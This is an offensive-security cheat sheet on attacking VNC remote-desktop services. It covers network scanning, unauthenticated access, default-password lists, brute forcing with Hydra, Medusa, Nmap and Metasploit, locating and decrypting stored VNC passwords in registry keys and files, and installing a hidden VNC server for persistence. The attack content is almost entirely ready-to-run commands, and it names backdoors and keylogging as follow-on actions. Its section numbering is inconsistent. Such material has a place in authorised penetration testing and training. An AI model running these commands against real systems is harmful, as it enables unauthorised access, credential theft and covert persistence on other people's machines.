# VNC - COMPLETE ATTACK CHAIN <a name="vnc"></a>

## 1.1 THEORY & BACKGROUND

**Virtual Network Computing (VNC)**:
- **Protocol**: RFB (Remote FrameBuffer)
- **Default Ports**: 5900/TCP (+ display number, e.g., 5901, 5902)
- **Security**: Weak - often no encryption, weak password auth
- **Types**: RealVNC, TightVNC, UltraVNC, TigerVNC, x11vnc

---

## 1.2 ENUMERATION PHASE

**Scan for VNC:**
```bash
# Nmap:
nmap -p 5900-5910 --open 192.168.1.0/24

# With VNC scripts:
nmap -p 5900-5910 --script vnc-info,vnc-title 192.168.1.100

# Check authentication:
nmap -p 5900 --script vnc-brute 192.168.1.100

# Detailed:
nmap -p 5900 -sV -sC 192.168.1.100

# Masscan:
masscan -p5900-5910 192.168.0.0/16 --rate=10000
```

**VNC Version Detection:**
```bash
# Connect and grab banner:
nc 192.168.1.100 5900
# Output: RFB 003.008 (version)

# Using Metasploit:
msfconsole
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS 192.168.1.0/24
run
```

---

## 8.3 EXPLOITATION PHASE

### 1.3.1 Authentication Bypass

**No Authentication:**
```bash
# Check for VNC without auth:
msfconsole
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS 192.168.1.100
run

# If no auth required, connect directly:
vncviewer 192.168.1.100:5900
# Or
vncviewer 192.168.1.100:0  # Display :0 = port 5900
```

**Default Passwords:**

Common VNC default/weak passwords:
```
password
PASSW0RD
vnc
admin
123456
root
pass
(empty)
```

```bash
# Try with vncviewer:
vncviewer 192.168.1.100:5900
# Enter password: password

# Automated:
for pass in password PASSW0RD vnc admin 123456; do
    echo "Trying: $pass"
    echo $pass | vncviewer -passwd /dev/stdin 192.168.1.100:5900
done
```

### 1.3.2 Password Attacks

**Brute Force:**
```bash
# Hydra:
hydra -P passwords.txt vnc://192.168.1.100

# Specific port:
hydra -s 5901 -P passwords.txt vnc://192.168.1.100

# Medusa:
medusa -h 192.168.1.100 -P passwords.txt -M vnc

# Nmap:
nmap -p 5900 --script vnc-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.100

# Metasploit:
msfconsole
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 192.168.1.100
set PASS_FILE /usr/share/wordlists/metasploit/vnc_passwords.txt
run
```

### 1.3.3 Password Decryption

**VNC Password Storage:**

VNC passwords stored encrypted (DES with fixed key):

Locations:
- Windows: Registry
  - `HKEY_CURRENT_USER\Software\RealVNC\WinVNC4\Password`
  - `HKEY_LOCAL_USER\Software\TightVNC\Server\Password`
  - `HKEY_CURRENT_USER\Software\TigerVNC\WinVNC4\Password`
  
- Linux: Files
  - `~/.vnc/passwd`
  - `/etc/vnc/passwd`
  - `~/.vnc/config`

**Decrypt VNC Password:**
```bash
# Tool: vncpasswd.py
wget https://raw.githubusercontent.com/trinitronx/vncpasswd.py/master/vncpasswd.py

# If you have the encrypted password file:
python vncpasswd.py -d -f ~/.vnc/passwd

# If you have hex encrypted password:
python vncpasswd.py -d -hex E8B7B1C6D0A1F5A2

# From Windows registry:
# Export registry key, extract hex value
# Decrypt with vncpasswd.py

# Online tools:
# https://www.raymond.cc/blog/download/did/232/

# Metasploit module:
msfconsole
use post/windows/gather/credentials/vnc
set SESSION 1
run
```

---

## 1.4 POST-EXPLOITATION

**VNC Client Usage:**
```bash
# TightVNC viewer:
vncviewer 192.168.1.100:5900

# RealVNC viewer:
vncviewer 192.168.1.100:0

# With password:
vncviewer 192.168.1.100:5900 -passwd password.txt

# Full screen:
vncviewer 192.168.1.100:5900 -fullscreen

# View only (no interaction):
vncviewer 192.168.1.100:5900 -viewonly

# Specify encoding for speed:
vncviewer 192.168.1.100:5900 -encoding tight

# Compressed:
vncviewer 192.168.1.100:5900 -compresslevel 9

# Lower quality for speed:
vncviewer 192.168.1.100:5900 -quality 3
```

**Actions via VNC:**
- Full desktop access (like RDP but often slower)
- Extract files
- Install backdoors
- Screenshot capture
- Keylogging (if VNC server has input enabled)
- Pivot to other systems

**VNC Persistence:**
```bash
# Install VNC server on compromised machine:

# Linux:
apt-get install tightvncserver
vncserver :1
# Set password

# Make it start on boot:
systemctl enable vncserver@:1

# Windows:
# Download and install TightVNC or UltraVNC
# Configure to start as service
# Set password

# Stealth: Use high port number
vncserver :99  # Port 5999
```

---